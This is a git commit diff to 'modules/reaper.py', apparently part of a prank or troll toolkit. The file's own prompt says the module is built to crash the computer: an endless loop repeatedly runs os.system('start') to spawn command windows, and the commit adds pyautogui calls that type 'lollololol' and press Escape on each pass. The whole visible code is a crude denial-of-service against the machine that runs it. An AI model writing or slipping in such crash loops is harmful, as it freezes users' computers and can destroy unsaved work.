157f398d23155fa986860fd6817c430155e9d371
Stremz C# <121738120+itsstremz@users.noreply.github.com>
2023-01-02 00:38:40 +0100

    Update reaper.py

--- modules/reaper.py
+++ modules/reaper.py
@@ -6,3 +6,5 @@ import pyautogui
 lol = input("if you don't want your pc to get fucked, close the program now since te reaper module is build to crash your pc")
 while True:
     os.system("start")
+    pyautogui.write('lollololol')
+    pyautogui.hotkey('esc')
